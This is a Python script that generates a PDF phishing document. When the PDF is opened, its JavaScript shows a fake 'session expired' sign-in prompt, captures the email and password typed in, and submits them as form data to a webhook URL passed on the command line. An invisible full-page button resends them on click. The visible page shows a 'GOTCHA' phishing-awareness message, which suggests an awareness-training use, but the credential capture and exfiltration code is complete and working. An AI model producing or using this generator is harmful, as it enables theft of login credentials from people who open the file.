#!/usr/bin/env python3
# Usage:
#   python3 pdfXss-gen.py <WEBHOOK_URL> <OUTPUT_FILE>
#   python3 pdfXss-gen.py https://webhook.site/CODE-HERE storedXss.pdf

import sys

WEBHOOK = sys.argv[1] if len(sys.argv) > 1 else "https://YOUR-WEBHOOK.example/collect"
OUT     = sys.argv[2] if len(sys.argv) > 2 else "storedXss.pdf"


def esc(s):
    return (s.replace("\\", "\\\\")
             .replace("(", "\\(")
             .replace(")", "\\)")
             .replace("\n", "\\n"))


# --- JS: original prompts + explicit submit trigger ------------------------
js = r'''
var u = app.response({
  cQuestion: "Your session has expired. Please sign in again.",
  cTitle:    "Sign in",
  bPassword: false
});

var p = app.response({
  cQuestion: "Password:",
  cTitle:    "Sign in",
  bPassword: true
});

if (u != null) this.getField("email").value = u;
if (p != null) this.getField("password").value = p;

// Commit the field values, then fire the submit from JS.
this.calculateNow();

try {
  this.submitForm({
    cURL:      "''' + WEBHOOK + r'''",
    cSubmitAs: "XFDF"
  });
} catch (e) {
  try { this.submitForm("''' + WEBHOOK + r'''"); } catch (e2) {}
}
'''
jsb = esc(js).encode("latin-1", "replace")


# --- Page content: the GOTCHA page from your screenshot --------------------
content = b"""q
0.08 0.08 0.10 rg
0 0 612 792 re f
Q

q
0.85 0.10 0.10 rg
0 620 612 172 re f
Q

1 1 1 rg
BT /F2 62 Tf 50 720 Td (GOTCHA.) Tj ET
BT /F1 16 Tf 52 680 Td (You fell for it.) Tj ET

1 1 1 rg
BT /F2 30 Tf 50 520 Td (You opened this file without thinking.) Tj ET
BT /F1 15 Tf 50 485 Td (That is exactly how the trap works.) Tj ET

0.85 0.10 0.10 rg
50 430 512 2 re f
Q

1 1 1 rg
BT /F1 14 Tf 50 395 Td (There was no prize. No report. No test. Nothing useful.) Tj ET
BT /F1 14 Tf 50 372 Td (Just bait, and you took it from someone you do not) Tj ET
BT /F1 14 Tf 50 349 Td (even know.) Tj ET

BT /F2 20 Tf 50 300 Td (You were not careful enough.) Tj ET

BT /F1 13 Tf 50 255 Td (Next time:) Tj ET
BT /F1 13 Tf 80 232 Td (- Check the sender before opening any attachment.) Tj ET
BT /F1 13 Tf 80 210 Td (- If a document asks you to log in, close it.) Tj ET
BT /F1 13 Tf 80 188 Td (- Never type credentials into a file.) Tj ET

0.85 0.10 0.10 rg
50 120 512 2 re f
Q

0.70 0.70 0.75 rg
BT /F1 12 Tf 50 90 Td (Remember this feeling. This is what deception feels like.) Tj ET
BT /F1 10 Tf 50 70 Td (If someone sent this to teach you a lesson, they did it for a reason.) Tj ET
BT /F1 10 Tf 50 54 Td (If no one did, then the bait was real, and you took it.) Tj ET
"""

ap = b"1 1 1 rg 0 0 1 1 re f"


# --- PDF objects ---------------
objs = [
    # 1 Catalog — JS on open + AcroForm
    b"<< /Type /Catalog /Pages 2 0 R /AcroForm 6 0 R "
    b"/OpenAction << /S /JavaScript /JS (" + jsb + b") >> >>",

    # 2 Pages
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",

    # 3 Page — content + three annotations (email, password, submit)
    b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
    b"/Resources << /Font << /F1 4 0 R /F2 5 0 R >> >> "
    b"/Contents 7 0 R /Annots [8 0 R 9 0 R 10 0 R] >>",

    # 4, 5 Fonts
    b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>",

    # 6 AcroForm with three fields (email, password, submit)
    b"<< /Type /AcroForm /Fields [8 0 R 9 0 R 10 0 R] "
    b"/NeedAppearances true "
    b"/DR << /Font << /F1 4 0 R /F2 5 0 R >> >> /DA (/F1 12 Tf 0 g) >>",

    # 7 Content stream
    b"<< /Length " + str(len(content)).encode() + b" >>\nstream\n"
    + content + b"\nendstream",

    # 8 Hidden email field
    b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (email) /F 2 "
    b"/Rect [0 0 1 1] /DA (/F1 12 Tf 0 g) >>",

    # 9 Hidden password field
    b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (password) /FF 4096 /F 2 "
    b"/Rect [0 0 1 1] /DA (/F1 12 Tf 0 g) >>",

    # 10 Full-page submit button (same as original gen_pdf.py)
    b"<< /Type /Annot /Subtype /Widget /FT /Btn /T (submit) /FF 65536 "
    b"/Rect [0 0 612 792] /F 4 "
    b"/A << /S /SubmitForm /F << /Type /Filespec /FS /URL /F ("
    + WEBHOOK.encode() + b") >> >> "
    b"/AP << /N 11 0 R >> >>",

    # 11 Invisible button appearance
    b"<< /Type /XObject /Subtype /Form /BBox [0 0 612 792] "
    b"/Resources << >> /Length " + str(len(ap)).encode() + b" >>\nstream\n"
    + ap + b"\nendstream",
]


# --- Assemble --------------------------------------------------------------
pdf = b"%PDF-1.4\n"
offsets = []
for i, o in enumerate(objs, 1):
    offsets.append(len(pdf))
    pdf += b"%d 0 obj\n" % i + o + b"\nendobj\n"

xref = len(pdf)
n = len(objs) + 1
pdf += b"xref\n0 %d\n0000000000 65535 f \n" % n
for off in offsets:
    pdf += b"%010d 00000 n \n" % off
pdf += (b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n"
        % (n, xref))


with open(OUT, "wb") as f:
    f.write(pdf)

print("wrote", OUT, len(pdf), "bytes, webhook =", WEBHOOK)
